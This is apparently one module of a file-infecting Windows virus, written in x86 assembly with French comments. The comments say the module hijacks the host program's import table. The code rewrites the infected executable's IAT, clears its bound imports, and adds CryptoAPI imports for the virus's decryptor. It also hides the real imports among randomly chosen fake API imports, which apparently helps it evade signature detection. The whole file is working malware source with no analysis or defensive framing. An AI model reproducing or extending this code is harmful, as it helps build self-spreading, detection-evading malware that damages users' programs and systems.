   ;MODULE : FUSION IMPORTS
   ;Ce module est chargé de détourner l'IAT de l'hôte et d'importer les API nécessaires
   ;au décrypteur
   ;

   iat_crypto_decrypteur:
       db 'CryptAcquireContextA',0
       db 'CryptCreateHash',0
       db 'CryptHashData',0
       db 'CryptDeriveKey',0
       db 'CryptDecrypt',0
       dd 0

   ;IMPORTS_INIT:  initialise le module
   ; in : edx--> pe header
   ; out :
   imports_init proc near
           pusha
           mov eax,[ebp+infection_rva]
           mov [edx+80h],eax      ;tout d'abord, on met la nouvelle iat au debut du virus

           mov ecx,TAILLE_IMPORTS
           xor eax,eax
           dec eax
           rep stosb

           add [edx+84h],dword ptr NB_DLLS_IMPORTEES*14h
           xor eax,eax          ;efface les bounds imports pour forcer le traitement de l'IAT
           lea edi,[edx+0D0h]
           stosd
           stosd
           popa
           ret
   imports_init endp



   ;ADD_IID_DECRYPTEUR :  ajoute un iid à l'iat
   ; in : esi-> raw iat hote  edi-->nouvelle raw iat  ecx=size of host's imports  eax->dll name
   ; out :
   add_iid_decrypteur proc near
           pusha
           mov edx,eax
           mov ebx,[ebp+infection_rva]
           lea ebx,[ebx+ecx+14h*NB_DLLS_IMPORTEES] ; fait de la place pour les deux IID (kernel32 et advapi32)
           mov [ebp+a32_oft],ebx
           add ebx,MAX_APIS_IMPORTEES*4
           mov [ebp+a32_ft],ebx
           add ebx,MAX_APIS_IMPORTEES*4
           mov [ebp+iat_noms_apis_rva],ebx
           lea ebx,[edi+ecx+14h*NB_DLLS_IMPORTEES+MAX_APIS_IMPORTEES*8]
           mov [ebp+iat_noms_apis_raw],ebx
           xor ebx,ebx
   recopie_ancienne_iat:
           mov ecx,14h
           rep movsb       ;recopie l'ancienne IAT de l'hote
           cmp [esi+0ch],ebx   ;ne copie pas l'IID nul
           jnz recopie_ancienne_iat

           push edi
           call cherche_espace
           mov edi,eax
           mov esi,edx                     ;rajoute l'iid
           mov ecx,13
           rep movsb
           pop edi
           mov eax,[ebp+a32_oft]           ;IID de advapi32.dll
           stosd
           xor eax,eax
           stosd
           stosd
           mov eax,ebx                     ;rva de "nomdll.dll"
           stosd
           mov eax,[ebp+a32_ft]
           stosd

           mov ecx,14h                     ;IID nul
           xor eax,eax
           rep stosb
           popa
           ret
   add_iid_decrypteur endp


   ;DEAL_IMPORTS : in : esi-> liste des apis à importer,  eax->dll name
   ;
   deal_imports proc near
           pusha
           push eax
           call_ LoadLibrary
           mov ebx,eax
           xor ecx,ecx
           lea edx,[ebp+index_iat]
   ajoute_apis:
   ;================== fake imports
           mov eax,MAX_FAKE_APIS_IMPORTEES/MAX_REAL_APIS_IMPORTEES
           call rand_tuna
           mov edi,eax
           push esi
   ajoute_fake_api:
           call random_api_name
           call check_compatibilite_api        ;api compat xp 2000 et 98 ?
           test esi,esi
           jz ajoute_fake_api
           call deal_1_import
           dec edi
           jns ajoute_fake_api
           pop esi
   ;================== real import
           mov [edx],ecx
           call deal_1_import
           add edx,4
           cmp [esi],byte ptr 0
           jnz ajoute_apis

           call deal_1_import

           jmp di4

   ;remplit les trous laissée dans l'espace IMPORT (-1) par du rand()
           mov esi,[ebp+iat_noms_apis_raw]
           xor ebx,ebx
           dec bl

           mov ecx,TAILLE_IMPORTS-14h*3
   di2:    cmp [esi],bl
           jnz di3
           mov edi,esi
           xor eax,eax
           dec eax
           call rand_tuna
           stosb
   di3:    inc esi
           loop di2
   di4:
           popa
           ret
   deal_imports endp

   ;RANDOM_API_NAME : renvoit un nom d'api aleatoire
   ; in : ebx--> HMODULE du dll
   ; out: esi--> rand apiname
   random_api_name proc near
       push ebx ecx edx edi
       mov edx,ebx
       mov ebx,[edx+3ch]
       add ebx,edx                     ; ebx--> PE Header du dll
       mov ecx,[ebx+78h]
       add ecx,edx                     ; ecx--> export table
       mov eax,[ecx+018h]              ; nb de noms exportés
       call rand_tuna
       mov esi,[ecx+20h]               ;liste des noms
       add esi,edx
       mov esi,[esi+eax*4]
       add esi,edx
       pop edi edx ecx ebx
       ret
   random_api_name endp

   ;DEAL_1_IMPORT : ajoute une api au FT et a l'OFT hooké
   ;    in : esi->apiname, a32_oft renseigné, ecx=index dans l'OFT/FT
   ;   out : esi-> juste apres l'apiname, ecx+=1
   deal_1_import proc near
           push eax ebx edi
   recopie_api:
           xor eax,eax
           xor ebx,ebx
           cmp [esi],eax
           jz ra13
           call cherche_espace             ; eax-->espace libre(raw adresse) ebx(future rva)
           mov edi,eax
           xor ax,ax
           stosw
   ra12:   lodsb
           test al,al
           stosb
           jnz ra12
   ra13:
           mov edi,[ebp+a32_oft]               ; oft
           lea eax,[edi+ecx*4]
           sub eax,[ebp+infection_rva]
           add eax,[ebp+infection_raw]         ; rva-->raw
           mov [eax],ebx
           mov [eax+MAX_APIS_IMPORTEES*4],ebx  ; ft
           inc ecx
           pop edi ebx eax
           ret
   deal_1_import endp


   ;CHERCHE_ESPACE:    in  :
   ;                   out : eax = raw adresse
   ;                         ebx = rva
   ;renvoie un bloc de TAILLE_API bytes de libres
   cherche_espace proc near
           push edi
           push ecx
           push edx
           mov edi,[ebp+iat_noms_apis_raw]
   cherche:
           xor eax,eax
           dec eax
           call rand_tuna
           xor edx,edx
           mov ecx,TAILLE_IMPORTS/2-TAILLE_API
           div ecx
           mov ecx,edx
           mov edx,TAILLE_API
           add ecx,edx
           dec edx
           not edx
           and ecx,edx                     ; aligne sur 32 octets, plus facile apres
           cmp byte ptr [edi+ecx+5],-1
           jnz cherche
           lea eax,[edi+ecx]
           mov ebx,[ebp+iat_noms_apis_rva]
           add ebx,ecx
           pop edx
           pop ecx
           pop edi
           ret
   cherche_espace endp

   ;CHECK_COMPATIBILITE_API : verifie si l'api est dispo sous 98 xp et 2000
   ;in : esi-->api name
   ;out: esi=0 si pas compat
   check_compatibilite_api proc near
       push eax edi ecx
       mov eax,esi
       call calc_crc
       mov edi,[ebp+poly_liste_apis_compat]
       mov ecx,[ebp+poly_nb_apis_compat]
       repnz scasd
       jz cca_compat
       xor esi,esi
   cca_compat:
       pop ecx edi eax
       ret
   check_compatibilite_api endp


   apis_gdi32_compatibles:
       dd "rien"

   apis_advapi_compatibles:
       include apis_advapi_compat.inc
   nb_apis_advapi_compatibles EQU ($ - offset apis_advapi_compatibles)/4
